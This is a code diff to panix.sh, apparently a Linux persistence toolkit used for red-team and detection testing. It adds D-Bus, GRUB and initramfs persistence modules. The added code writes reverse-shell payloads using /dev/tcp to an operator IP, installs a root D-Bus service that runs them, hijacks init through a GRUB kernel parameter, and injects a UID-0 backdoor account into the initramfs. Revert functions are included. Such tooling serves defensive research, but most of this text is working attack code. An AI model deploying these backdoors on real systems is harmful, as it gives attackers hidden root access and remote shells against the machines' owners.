@@ -54,18 +54,23 @@ usage_root() {
 	echo "  --cap                  Add capabilities persistence"
 	echo "  --create-user          Create a new user"
 	echo "  --cron                 Cron job persistence"
+	echo "  --dbus                 D-Bus service persistence"
 	echo "  --generator            Generator persistence"
 	echo "  --git                  Git hook/pager persistence"
+	echo "  --grub                 GRUB bootloader persistence"
 	echo "  --initd                SysV Init (init.d) persistence"
+	echo "  --initramfs            Initramfs persistence"
 	echo "  --ld-preload           LD_PRELOAD backdoor persistence"
 	echo "  --lkm                  Loadable Kernel Module (LKM) persistence"
 	echo "  --malicious-container  Docker container with host escape"
 	echo "  --malicious-package    Build and Install a package for persistence (DPKG/RPM)"
 	echo "  --motd                 Message Of The Day (MOTD) persistence (not available on RHEL derivatives)"
+	echo "  --network-manager      NetworkManager dispatcher script persistence"
 	echo "  --package-manager      Package Manager persistence (APT/YUM/DNF)"
 	echo "  --pam                  Pluggable Authentication Module (PAM) persistence (backdoored PAM & pam_exec)"
 	echo "  --passwd-user          Add user to /etc/passwd directly"
 	echo "  --password-change      Change user password"
+	echo "  --polkit               Allow pkexec as any user through Polkit"
 	echo "  --rc-local             Run Control (rc.local) persistence"
 	echo "  --reverse-shell        Reverse shell persistence (supports multiple LOLBins)"
 	echo "  --rootkit              Diamorphine (LKM) rootkit persistence"
@@ -96,18 +101,23 @@ revert_all() {
 		revert_cap
 		revert_create_user
 		revert_cron
+		revert_dbus
 		revert_generator
 		revert_git
+		revert_grub
 		revert_initd
+		revert_initramfs
 		revert_ld_preload
 		revert_lkm
 		revert_malicious_container
 		revert_malicious_package
 		revert_motd_backdoor
+		revert_network_manager
 		revert_package_manager
 		revert_pam
 		revert_passwd_user
 		revert_password_change
+		revert_polkit
 		revert_rc_local
 		revert_reverse_shell
 		revert_rootkit
@@ -1575,6 +1585,229 @@ revert_cron() {
     return 0
 }
 
+# Module: setup_dbus.sh
+setup_dbus() {
+	local default=0
+	local custom=0
+	local ip=""
+	local port=""
+	local payload=""
+
+	# Check that the user is root.
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	# Check that D-Bus is installed by ensuring a key command exists.
+	if ! command -v dbus-daemon &>/dev/null; then
+		echo "Error: D-Bus does not appear to be installed or not in PATH."
+		exit 1
+	fi
+
+	usage_dbus() {
+		echo "Usage: ./panix.sh --dbus [OPTIONS]"
+		echo "--examples                         Display command examples"
+		echo "--default                          Use default reverse shell payload"
+		echo "  --ip <ip>                          Specify IP address"
+		echo "  --port <port>                      Specify port number"
+		echo "--custom                           Use custom payload"
+		echo "  --payload <payload>                Specify custom payload command"
+		echo "--help|-h                          Show this help message"
+	}
+
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--default )
+				default=1
+				;;
+			--custom )
+				custom=1
+				;;
+			--ip )
+				shift
+				ip="$1"
+				;;
+			--port )
+				shift
+				port="$1"
+				;;
+			--payload )
+				shift
+				payload="$1"
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./panix.sh --dbus --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./panix.sh --dbus --custom --payload 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
+				exit 0
+				;;
+			--help|-h )
+				usage_dbus
+				exit 0
+				;;
+			* )
+				echo "Invalid option for --dbus: $1"
+				echo "Try './panix.sh --dbus --help' for more information."
+				exit 1
+				;;
+		esac
+		shift
+	done
+
+	# Validate that exactly one of --default or --custom is provided.
+	if [[ $default -eq 1 && $custom -eq 1 ]]; then
+		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './panix.sh --dbus --help' for more information."
+		exit 1
+	fi
+
+	if [[ $default -eq 0 && $custom -eq 0 ]]; then
+		echo "Error: Either --default or --custom must be specified."
+		echo "Try './panix.sh --dbus --help' for more information."
+		exit 1
+	fi
+
+	# For --default, require --ip and --port.
+	if [[ $default -eq 1 ]]; then
+		if [[ -z $ip || -z $port ]]; then
+			echo "Error: --ip and --port must be specified when using --default."
+			echo "Try './panix.sh --dbus --help' for more information."
+			exit 1
+		fi
+		payload="nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' & disown"
+	fi
+
+	# For --custom, require --payload.
+	if [[ $custom -eq 1 ]]; then
+		if [[ -z $payload ]]; then
+			echo "Error: --payload must be specified when using --custom."
+			echo "Try './panix.sh --dbus --help' for more information."
+			exit 1
+		fi
+	fi
+
+	### 1. Create/Update the D-Bus service file.
+	local service_file="/usr/share/dbus-1/system-services/org.panix.persistence.service"
+	if [[ ! -d $(dirname "$service_file") ]]; then
+		echo "Error: $(dirname "$service_file") does not exist. D-Bus may not be installed/configured."
+		exit 1
+	fi
+
+	cat <<'EOF' > "$service_file"
+[D-BUS Service]
+Name=org.panix.persistence
+Exec=/usr/local/bin/dbus-panix.sh
+User=root
+EOF
+	echo "[+] Created/updated D-Bus service file: $service_file"
+
+	### 2. Create/Update the payload script.
+	local payload_script="/usr/local/bin/dbus-panix.sh"
+	cat <<EOF > "$payload_script"
+#!/bin/bash
+# When D-Bus triggers this service, execute payload.
+${payload}
+EOF
+	chmod +x "$payload_script"
+	echo "[+] Created/updated payload script: $payload_script"
+
+	### 3. Create/Update the D-Bus configuration file.
+	local conf_file="/etc/dbus-1/system.d/org.panix.persistence.conf"
+	if [[ ! -d $(dirname "$conf_file") ]]; then
+		echo "Error: $(dirname "$conf_file") does not exist. D-Bus may not be installed/configured."
+		exit 1
+	fi
+
+	cat <<'EOF' > "$conf_file"
+<!DOCTYPE busconfig PUBLIC "-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN"
+	"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+<busconfig>
+	<!-- Allow any user to own, send to, and access the specified service -->
+	<policy context="default">
+		<allow own="org.panix.persistence"/>
+		<allow send_destination="org.panix.persistence"/>
+		<allow send_interface="org.panix.persistence"/>
+	</policy>
+</busconfig>
+EOF
+	echo "[+] Created/updated D-Bus config file: $conf_file"
+
+	### Final step: Restart D-Bus to apply changes.
+	echo "[*] Restarting D-Bus..."
+	systemctl restart dbus
+	if [[ $? -eq 0 ]]; then
+		echo "[+] D-Bus restarted successfully."
+	else
+		echo "[-] Failed to restart D-Bus. You may need to restart it manually."
+	fi
+
+	echo "[+] D-Bus persistence module completed. Test with:"
+	echo "    dbus-send --system --type=method_call --dest=org.panix.persistence /org/panix/persistence org.panix.persistence.Method"
+}
+
+# Revert Module: revert_dbus.sh
+revert_dbus() {
+	usage_revert_dbus() {
+		echo "Usage: ./panix.sh --revert dbus"
+		echo "Reverts any changes made by the setup_dbus module."
+	}
+
+	# Must be executed as root.
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	local service_file="/usr/share/dbus-1/system-services/org.panix.persistence.service"
+	local payload_script="/usr/local/bin/dbus-panix.sh"
+	local conf_file="/etc/dbus-1/system.d/org.panix.persistence.conf"
+
+	echo "[*] Reverting D-Bus persistence module..."
+
+	# Remove the D-Bus service file.
+	if [[ -f "$service_file" ]]; then
+		echo "[+] Removing D-Bus service file: $service_file..."
+		rm -f "$service_file"
+		echo "[+] D-Bus service file removed."
+	else
+		echo "[-] D-Bus service file not found: $service_file"
+	fi
+
+	# Remove the payload script.
+	if [[ -f "$payload_script" ]]; then
+		echo "[+] Removing payload script: $payload_script..."
+		rm -f "$payload_script"
+		echo "[+] Payload script removed."
+	else
+		echo "[-] Payload script not found: $payload_script"
+	fi
+
+	# Remove the D-Bus configuration file.
+	if [[ -f "$conf_file" ]]; then
+		echo "[+] Removing D-Bus configuration file: $conf_file..."
+		rm -f "$conf_file"
+		echo "[+] D-Bus configuration file removed."
+	else
+		echo "[-] D-Bus configuration file not found: $conf_file"
+	fi
+
+	# Restart D-Bus to apply the changes.
+	echo "[*] Restarting D-Bus..."
+	systemctl restart dbus
+	if [[ $? -eq 0 ]]; then
+		echo "[+] D-Bus restarted successfully."
+	else
+		echo "[-] Failed to restart D-Bus. You may need to restart it manually."
+	fi
+
+	echo "[+] D-Bus persistence reverted."
+	return 0
+}
+
 # Module: setup_generator_persistence.sh
 setup_generator_persistence() {
 	local ip=""
@@ -2043,6 +2276,254 @@ revert_git() {
 	return 0
 }
 
+# Module: setup_grub.sh
+setup_grub() {
+	local default=0
+	local custom=0
+	local ip=""
+	local port=""
+	local payload=""
+
+	# Check that the user is root.
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_grub() {
+		echo "Usage: ./panix.sh --grub [OPTIONS]"
+		echo "--default                          Use default reverse shell payload"
+		echo "  --ip <ip>                        Specify IP address for reverse shell"
+		echo "  --port <port>                    Specify port for reverse shell"
+		echo "--custom                           Use custom payload"
+		echo "  --payload <payload>              Specify custom payload command"
+		echo ""
+	}
+
+	# Detect the distribution.
+	local distro_id=""
+	if [[ -f /etc/os-release ]]; then
+		source /etc/os-release
+		distro_id="$ID"
+	else
+		echo "Error: Unable to detect Linux distribution."
+		exit 1
+	fi
+
+	# Process options.
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--default )
+				default=1
+				;;
+			--custom )
+				custom=1
+				;;
+			--ip )
+				shift
+				ip="$1"
+				;;
+			--port )
+				shift
+				port="$1"
+				;;
+			--payload )
+				shift
+				payload="$1"
+				;;
+			--help|-h )
+				usage_grub
+				exit 0
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./panix.sh --grub --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./panix.sh --grub --custom --payload \"nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &\""
+				echo ""
+				exit 0
+				;;
+			* )
+				echo "Invalid option for --grub: $1"
+				echo "Try './panix.sh --grub --help' for more information."
+				exit 1
+				;;
+		esac
+		shift
+	done
+
+	if [[ $default -eq 1 && $custom -eq 1 ]]; then
+		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './panix.sh --grub --help' for more information."
+		exit 1
+	fi
+
+	if [[ $default -eq 0 && $custom -eq 0 ]]; then
+		echo "Error: Either --default or --custom must be specified."
+		echo "Try './panix.sh --grub --help' for more information."
+		exit 1
+	fi
+
+	# Only proceed if distro is Ubuntu/Debian
+	if [[ "$distro_id" != "ubuntu" && "$distro_id" != "debian" ]]; then
+		echo "This module is not compatible with the current OS: $distro_id"
+		echo "This module is only compatible with Ubuntu/Debian, due to network/boot restrictions on other systems."
+		echo "Feel free to remove this check and adapt for other operating systems if you wish."
+		exit 1
+	fi
+
+	# Build the payload
+	if [[ $default -eq 1 ]]; then
+		if [[ -z $ip || -z $port ]]; then
+			echo "Error: --ip and --port must be provided when using --default."
+			exit 1
+		fi
+		payload="( sleep 10; nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' & disown ) &"
+	fi
+
+	if [[ $custom -eq 1 ]]; then
+		if [[ -z $payload ]]; then
+			echo "Error: --payload must be specified when using --custom."
+			exit 1
+		fi
+		payload="( sleep 10; ${payload} ) &"
+	fi
+
+	# 1) Create /grub-panix.sh as our init script
+	local init_script="/grub-panix.sh"
+	echo "[*] Creating backdoor init script at: $init_script"
+	cat <<EOF > "$init_script"
+#!/bin/bash
+# Panix GRUB Persistence Backdoor (Ubuntu/Debian)
+(
+	echo "[*] Panix backdoor payload will execute after 10 seconds delay."
+	${payload}
+	echo "[+] Panix payload executed."
+) &
+exec /sbin/init
+EOF
+
+	chmod +x "$init_script"
+	if [[ $? -ne 0 ]]; then
+		echo "Error: Unable to set execute permission on $init_script."
+		exit 1
+	fi
+	echo "[+] Backdoor init script created and made executable."
+
+	# 2) Create a custom file in /etc/default/grub.d/ to append init=/grub-panix.sh
+	local grub_custom_dir="/etc/default/grub.d"
+	local grub_custom_file="${grub_custom_dir}/99-panix.cfg"
+
+	mkdir -p "$grub_custom_dir"
+	echo "[*] Creating custom GRUB configuration file: $grub_custom_file"
+	cat <<EOF > "$grub_custom_file"
+# Panix GRUB persistence configuration
+GRUB_CMDLINE_LINUX_DEFAULT="\$GRUB_CMDLINE_LINUX_DEFAULT init=/grub-panix.sh"
+EOF
+	if [[ $? -ne 0 ]]; then
+		echo "Error: Unable to create $grub_custom_file"
+		exit 1
+	fi
+	echo "[+] Custom GRUB configuration file created."
+
+	# 3) Backup /etc/default/grub (optional, just in case)
+	local grub_default="/etc/default/grub"
+	if [[ ! -f "$grub_default" ]]; then
+		echo "Error: $grub_default not found!"
+		exit 1
+	fi
+
+	if [[ ! -f "${grub_default}.bak" ]]; then
+		echo "[*] Backing up $grub_default to ${grub_default}.bak..."
+		cp "$grub_default" "${grub_default}.bak"
+		if [[ $? -ne 0 ]]; then
+			echo "Error: Unable to back up $grub_default."
+			exit 1
+		fi
+		echo "[+] Backup created at ${grub_default}.bak"
+	else
+		echo "[!] A backup file ${grub_default}.bak already exists; skipping creation."
+	fi
+
+	# 4) Run update-grub to finalize changes
+	echo "[*] Running 'update-grub' to apply changes..."
+	if ! update-grub; then
+		echo "Error: update-grub failed!"
+		exit 1
+	fi
+	echo "[+] GRUB configuration updated. Reboot to activate the payload."
+}
+
+# Revert Module: revert_grub.sh
+revert_grub() {
+	usage_revert_grub() {
+		echo "Usage: ./panix.sh --revert grub"
+		echo "Reverts the GRUB persistence changes introduced by the module on Ubuntu/Debian."
+	}
+
+	# Must be run as root
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	echo "[*] Reverting GRUB persistence modifications..."
+
+	# 1) Restore /etc/default/grub if backup exists
+	if [[ -f /etc/default/grub.bak ]]; then
+		echo "[*] Restoring backup of /etc/default/grub from /etc/default/grub.bak..."
+		cp /etc/default/grub.bak /etc/default/grub
+		if [[ $? -ne 0 ]]; then
+			echo "Error: Failed to restore /etc/default/grub from backup."
+			return 1
+		fi
+		echo "[+] /etc/default/grub restored."
+	else
+		echo "[*] No backup /etc/default/grub.bak found. Skipping restore."
+	fi
+
+	# 2) Remove the /etc/grub.d/99_panix.cfg file
+	local grub_custom_file="/etc/default/grub.d/99-panix.cfg"
+	if [[ -f "$grub_custom_file" ]]; then
+		echo "[*] Removing $grub_custom_file..."
+		rm -f "$grub_custom_file"
+		if [[ $? -ne 0 ]]; then
+			echo "Error: Failed to remove $grub_custom_file."
+			return 1
+		fi
+		echo "[+] $grub_custom_file removed."
+	else
+		echo "[*] $grub_custom_file not found; nothing to remove."
+	fi
+
+	# 3) Remove the /grub-panix.sh script
+	local init_script="/grub-panix.sh"
+	if [[ -f "$init_script" ]]; then
+		echo "[*] Removing $init_script..."
+		rm -f "$init_script"
+		if [[ $? -ne 0 ]]; then
+			echo "Error: Failed to remove $init_script."
+			return 1
+		fi
+		echo "[+] $init_script removed."
+	else
+		echo "[*] $init_script not found; nothing to remove."
+	fi
+
+	# 4) Update GRUB (Ubuntu/Debian)
+	echo "[*] Updating GRUB configuration..."
+	if ! update-grub; then
+		echo "Error: update-grub failed!"
+		return 1
+	fi
+	echo "[+] GRUB configuration updated."
+
+	echo "[+] GRUB persistence reverted successfully."
+	return 0
+}
+
 # Module: setup_initd_backdoor.sh
 setup_initd_backdoor() {
 	local default=0
@@ -2286,6 +2767,417 @@ revert_initd() {
 	echo "[+] Killing any processes started by '$initd_path'..."
 	pkill -f "$initd_path"
 
+	return 0
+}
+
+# Module: setup_initramfs.sh
+setup_initramfs() {
+	# Ensure that only root can run this module.
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_initramfs() {
+		echo "Usage: ./panix.sh --initramfs [OPTIONS]"
+		echo ""
+		echo "Required options:"
+		echo "  --username <name>         Specify the username to be added"
+		echo "  --password <password>     Specify the plaintext password for the user"
+		echo "  --snapshot yes            Confirm you have a snapshot/backup (for safety)"
+		echo ""
+		echo "Persistence method (choose exactly one):"
+		echo "  --dracut                  Use dracut-based initramfs modification method (requires dracut-core)"
+		echo "  --binwalk                 Use binwalk-based initramfs modification method (requires binwalk and initramfs-tools)"
+		echo "  --mkinitramfs             Use mkinitramfs-based initramfs modification method (requires mkinitramfs and unmkinitramfs)"
+		echo ""
+		echo "Examples:"
+		echo "sudo ./panix.sh --initramfs --dracut --username panix --password secret --snapshot yes"
+		echo "sudo ./panix.sh --initramfs --binwalk --username panix --password secret --snapshot yes"
+		echo "sudo ./panix.sh --initramfs --mkinitramfs --username panix --password secret --snapshot yes"
+	}
+
+	# Initialize option flags.
+	local use_dracut=0
+	local use_binwalk=0
+	local use_mkinitramfs=0
+	local snapshot=""
+	local username=""
+	local password=""
+
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--dracut)
+				use_dracut=1
+				;;
+			--binwalk)
+				use_binwalk=1
+				;;
+			--mkinitramfs)
+				use_mkinitramfs=1
+				;;
+			--username)
+				shift
+				username="$1"
+				;;
+			--password)
+				shift
+				password="$1"
+				;;
+			--snapshot)
+				shift
+				snapshot="$1"
+				;;
+			--help|-h)
+				usage_initramfs
+				exit 0
+				;;
+			--examples)
+				usage_initramfs
+				exit 0
+				;;
+			*)
+				echo "Invalid option: $1"
+				usage_initramfs
+				exit 1
+				;;
+		esac
+		shift
+	done
+
+	# Ensure exactly one persistence method is chosen.
+	local method_count=$(( use_dracut + use_binwalk + use_mkinitramfs ))
+	if [[ $method_count -ne 1 ]]; then
+		echo "Error: You must specify exactly one persistence method (--dracut, --binwalk, or --mkinitramfs)."
+		usage_initramfs
+		exit 1
+	fi
+
+	# Verify that the required flags are provided.
+	if [[ -z "$username" || -z "$password" ]]; then
+		echo "Error: You must specify both --username and --password."
+		usage_initramfs
+		exit 1
+	fi
+
+	if [[ "$snapshot" != "yes" ]]; then
+		echo "[!] Error: This module is potentially dangerous and can lock you out of your system."
+		echo "[!] Learning how to undo the changes in the initramfs rescue shell is a great learning experience however!"
+		echo "[!] For safety, you must supply --snapshot yes. Aborting."
+		exit 1
+	fi
+
+	# Generate the password hash using openssl.
+	local user_hash
+	user_hash=$(openssl passwd -6 "$password")
+	if [[ -z "$user_hash" ]]; then
+		echo "Error: Failed to generate password hash."
+		exit 1
+	fi
+
+	# Escape dollar signs so the hash is stored literally in the injected file.
+	local escaped_hash
+	escaped_hash=$(echo "$user_hash" | sed 's/\$/\\\$/g')
+
+	# Determine the correct initramfs file.
+	# On CentOS/RHEL, the file is usually named initramfs-$(uname -r)
+	# while on Debian/Ubuntu it may be initrd.img-$(uname -r)
+	local kernel_ver
+	kernel_ver=$(uname -r)
+	local INITRD=""
+	if [ -f "/boot/initramfs-${kernel_ver}" ]; then
+		INITRD="/boot/initramfs-${kernel_ver}"
+	elif [ -f "/boot/initrd.img-${kernel_ver}" ]; then
+		INITRD="/boot/initrd.img-${kernel_ver}"
+	else
+		echo "Error: Could not locate initramfs file for kernel ${kernel_ver}."
+		exit 1
+	fi
+
+	#############################
+	# Dracut-Based Method
+	#############################
+	if [[ $use_dracut -eq 1 ]]; then
+		if ! command -v dracut &>/dev/null; then
+			echo "Error: dracut-core is not installed. Please install it before continuing."
+			exit 1
+		fi
+
+		if [ -f /etc/os-release ]; then
+			. /etc/os-release
+		fi
+		if [[ "$ID" == "rhel" || "$ID" == "centos" || "$ID" == "fedora" ]]; then
+			echo "[!] Warning: This might fail on Red Hat based systems due to differences in initramfs handling."
+		fi
+
+		echo "[!] Will inject user '${username}' with hashed password '${user_hash}' (password: '${password}') into the initramfs."
+		echo "[!] Preparing Dracut-based initramfs persistence..."
+
+		# Create the dracut module directory.
+		mkdir -p /usr/lib/dracut/modules.d/99panix || { echo "Error: Could not create /usr/lib/dracut/modules.d/99panix"; exit 1; }
+		
+		# Create a simple module setup script that uses a single hook.
+		cat <<'EOF' > /usr/lib/dracut/modules.d/99panix/module-setup.sh
+#!/bin/bash
+check()  { return 0; }
+depends() { return 0; }
+install() {
+	inst_hook pre-pivot 99 "$moddir/backdoor-user.sh"
+}
+EOF
+		chmod +x /usr/lib/dracut/modules.d/99panix/module-setup.sh
+		echo "[+] Created dracut module setup script at /usr/lib/dracut/modules.d/99panix/module-setup.sh"
+
+		# Create the helper script named backdoor-user.sh.
+		cat <<EOF > /usr/lib/dracut/modules.d/99panix/backdoor-user.sh
+#!/bin/sh
+
+# Remount the real root if it's read-only.
+mount -o remount,rw /sysroot 2>/dev/null || {
+	echo "[dracut] Could not remount /sysroot as RW. Exiting."
+	exit 1
+}
+
+# Function to check if a user already exists in a file.
+check_user_exists() {
+	target="\$1"
+	file="\$2"
+	while read -r line; do
+		if echo "\$line" | grep -q "^\$target:"; then
+			return 0  # User exists.
+		fi
+	done < "\$file"
+	return 1  # User does not exist.
+}
+
+# Check and add the user to /etc/shadow.
+if check_user_exists "${username}" /sysroot/etc/shadow; then
+	echo "[dracut] User '${username}' already exists in /etc/shadow. Skipping."
+else
+	echo "${username}:${escaped_hash}:19000:0:99999:7:::" >> /sysroot/etc/shadow
+	echo "[dracut] Added '${username}' to /etc/shadow."
+fi
+
+# Check and add the user to /etc/passwd.
+if check_user_exists "${username}" /sysroot/etc/passwd; then
+	echo "[dracut] User '${username}' already exists in /etc/passwd. Skipping."
+else
+	echo "${username}:x:0:0::/root:/bin/bash" >> /sysroot/etc/passwd
+	echo "[dracut] Added '${username}' to /etc/passwd."
+fi
+
+# Check and add the user to /etc/group.
+if check_user_exists "${username}" /sysroot/etc/group; then
+	echo "[dracut] User '${username}' already exists in /etc/group. Skipping."
+else
+	echo "${username}:x:1337:" >> /sysroot/etc/group
+	echo "[dracut] Added '${username}' to /etc/group."
+fi
+EOF
+		chmod +x /usr/lib/dracut/modules.d/99panix/backdoor-user.sh
+		echo "[+] Created dracut helper script at /usr/lib/dracut/modules.d/99panix/backdoor-user.sh"
+
+		echo "[!] Rebuilding initramfs with dracut..."
+		# Use the detected INITRD file and current kernel version.
+		dracut --force "$INITRD" "$kernel_ver"
+		if [[ $? -ne 0 ]]; then
+			echo "Error: dracut failed to rebuild initramfs."
+			exit 1
+		fi
+		echo "[+] Dracut rebuild complete."
+	fi
+
+	#############################
+	# Binwalk-Based Method
+	#############################
+	if [[ $use_binwalk -eq 1 ]]; then
+		if ! command -v binwalk &>/dev/null || ! command -v unmkinitramfs &>/dev/null; then
+			echo "Error: binwalk and/or unmkinitramfs (from initramfs-tools) are not installed."
+			exit 1
+		fi
+
+		echo "[!] Preparing Binwalk-based initramfs persistence..."
+		TMP_DIR=$(mktemp -d /tmp/initramfs.XXXXXX) || { echo "Error: Could not create temporary directory"; exit 1; }
+		echo "[!] Temporary directory: $TMP_DIR"
+
+		# Backup the current initramfs.
+		cp "$INITRD" "${INITRD}.bak" || { echo "Error: Could not backup initramfs file"; exit 1; }
+		cp "$INITRD" "$TMP_DIR/initrd.img" || { echo "Error: Could not copy initramfs to temporary directory"; exit 1; }
+		cd "$TMP_DIR" || exit 1
+
+		# Use binwalk to determine the trailer address.
+		ADDRESS=$(binwalk initrd.img | grep TRAILER | tail -1 | awk '{print $1}')
+		if [[ -z "$ADDRESS" ]]; then
+			echo "Error: Could not determine trailer address using binwalk. This is common in certain operating systems, such as Debian."
+			echo "       Please use the --mkinitramfs option instead."
+			exit 1
+		fi
+		echo "[!] Trailer address: $ADDRESS"
+
+		dd if=initrd.img of=initrd.img-begin count=$ADDRESS bs=1 2>/dev/null || { echo "Error: dd failed (begin)"; exit 1; }
+
+		unmkinitramfs initrd.img initrd_extracted || { echo "Error: unmkinitramfs failed"; exit 1; }
+		
+		INIT_FILE="initrd_extracted/main/init"
+		if [[ ! -f "$INIT_FILE" ]]; then
+			echo "Error: Could not find initramfs main/init file."
+			exit 1
+		fi
+		sed -i "/maybe_break init/i mount -o remount,rw \\\${rootmnt}\n\
+# Remove any previous entries for ${username}\n\
+sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/passwd\n\
+sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/shadow\n\
+sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/group\n\
+echo \"${username}:x:0:0::/root:/bin/bash\" >> \\\${rootmnt}/etc/passwd\n\
+echo '${username}:${user_hash}:19000:0:99999:7:::' >> \\\${rootmnt}/etc/shadow\n\
+echo \"${username}:x:1337:\" >> \\\${rootmnt}/etc/group\n" "$INIT_FILE"
+
+		mkdir -p initrd_repacked
+		cd initrd_extracted/main || exit 1
+		find . | sort | cpio -R 0:0 -o -H newc | gzip > ../../initrd.img-end || { echo "Error: Failed to repack initramfs"; exit 1; }
+		cd "$TMP_DIR" || exit 1
+		cat initrd.img-begin initrd.img-end > initrd.img-new || { echo "Error: Failed to combine initramfs parts"; exit 1; }
+		cp initrd.img-new "$INITRD" || { echo "Error: Could not install new initramfs"; exit 1; }
+		echo "[+] Binwalk-based initramfs persistence applied. New initramfs installed."
+		cd /
+		rm -rf "$TMP_DIR"
+	fi
+
+	#############################
+	# Mkinitramfs-Based Method
+	#############################
+	if [[ $use_mkinitramfs -eq 1 ]]; then
+		# Check if mkinitramfs and unmkinitramfs exist.
+		if ! command -v mkinitramfs &>/dev/null || ! command -v unmkinitramfs &>/dev/null; then
+			if [ -f /etc/os-release ]; then
+				. /etc/os-release
+			fi
+			if [[ "$ID" == "ubuntu" || "$ID" == "debian" ]]; then
+				echo "Error: mkinitramfs and/or unmkinitramfs not installed. Please install initramfs-tools (e.g., sudo apt install initramfs-tools)."
+			elif [[ "$ID" == "rhel" || "$ID" == "centos" || "$ID" == "fedora" ]]; then
+				echo "Error: mkinitramfs is not available on Red Hat based systems."
+			else
+				echo "Error: mkinitramfs and/or unmkinitramfs not installed. Please install the appropriate packages for your distribution."
+			fi
+			exit 1
+		fi
+
+		echo "[!] Preparing mkinitramfs-based initramfs persistence..."
+		TMP_DIR=$(mktemp -d /tmp/initramfs.XXXXXX) || { echo "Error: Could not create temporary directory"; exit 1; }
+		echo "[!] Temporary directory: $TMP_DIR"
+
+		cp "$INITRD" "${INITRD}.bak" || { echo "Error: Could not backup initramfs file"; exit 1; }
+		cp "$INITRD" "$TMP_DIR/initrd.img" || { echo "Error: Could not copy initramfs to temporary directory"; exit 1; }
+		cd "$TMP_DIR" || exit 1
+
+		unmkinitramfs initrd.img initrd_extracted || { echo "Error: unmkinitramfs failed"; exit 1; }
+		
+		# Determine the location of the init file.
+		if [[ -f "initrd_extracted/main/init" ]]; then
+			INIT_FILE="initrd_extracted/main/init"
+		elif [[ -f "initrd_extracted/init" ]]; then
+			INIT_FILE="initrd_extracted/init"
+		else
+			echo "Error: Could not find the init file in the extracted initramfs."
+			exit 1
+		fi
+
+		sed -i "/maybe_break init/i mount -o remount,rw \\\${rootmnt}\n\
+# Remove any previous entries for ${username}\n\
+sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/passwd\n\
+sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/shadow\n\
+sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/group\n\
+echo \"${username}:x:0:0::/root:/bin/bash\" >> \\\${rootmnt}/etc/passwd\n\
+echo '${username}:${user_hash}:19000:0:99999:7:::' >> \\\${rootmnt}/etc/shadow\n\
+echo \"${username}:x:1337:\" >> \\\${rootmnt}/etc/group\n" "$INIT_FILE"
+
+		cd initrd_extracted || exit 1
+		find . | sort | cpio -o -H newc | gzip > "$TMP_DIR/initrd.img-new" || { echo "Error: Failed to repack initramfs"; exit 1; }
+		cp "$TMP_DIR/initrd.img-new" "$INITRD" || { echo "Error: Could not install new initramfs"; exit 1; }
+		echo "[+] Mkinitramfs-based initramfs persistence applied. New initramfs installed."
+		cd /
+		rm -rf "$TMP_DIR"
+	fi
+
+	echo "[+] setup_initramfs module completed successfully."
+	echo "[!] WARNING: Ensure you have a recent snapshot/backup of your system before proceeding."
+}
+
+# Revert Module: revert_initramfs.sh
+# Function to revert initramfs changes
+revert_initramfs() {
+	usage_revert_initramfs() {
+		echo "Usage: sudo ./panix.sh --revert initramfs"
+		echo "This reverts changes made by the initramfs persistence module."
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# 1. Restore the original initramfs backup (if it exists)
+	local initrd="/boot/initrd.img-$(uname -r)"
+	local initrd_backup="${initrd}.bak"
+
+	if [[ -f "$initrd_backup" ]]; then
+		echo "[!] Restoring initramfs from backup: $initrd_backup..."
+		cp "$initrd_backup" "$initrd"
+		if [[ $? -ne 0 ]]; then
+			echo "Error: Failed to restore initramfs from backup."
+			return 1
+		fi
+		echo "[+] Initramfs restored successfully."
+	else
+		echo "[-] No backup initramfs found at $initrd_backup. Skipping restore."
+	fi
+
+	# 2. Remove the custom dracut module directory (if it exists)
+	local dracut_dir="/usr/lib/dracut/modules.d/99panix"
+	if [[ -d "$dracut_dir" ]]; then
+		echo "[!] Removing custom dracut module directory: $dracut_dir..."
+		rm -rf "$dracut_dir"
+		if [[ $? -ne 0 ]]; then
+			echo "Error: Failed to remove dracut module directory."
+			return 1
+		fi
+		echo "[+] Custom dracut module directory removed."
+	else
+		echo "[-] Custom dracut module directory not found: $dracut_dir"
+	fi
+
+	# 3. Rebuild the initramfs using dracut or update-initramfs
+	if command -v dracut &>/dev/null; then
+		echo "[!] Rebuilding initramfs using dracut..."
+		dracut --force "$initrd" "$(uname -r)"
+		if [[ $? -ne 0 ]]; then
+			echo "Error: dracut failed to rebuild initramfs."
+			return 1
+		fi
+		echo "[+] Initramfs rebuilt successfully with dracut."
+	elif command -v update-initramfs &>/dev/null; then
+		echo "[!] Rebuilding initramfs using update-initramfs..."
+		update-initramfs -u -k "$(uname -r)"
+		if [[ $? -ne 0 ]]; then
+			echo "Error: update-initramfs failed to rebuild initramfs."
+			return 1
+		fi
+		echo "[+] Initramfs rebuilt successfully with update-initramfs."
+	else
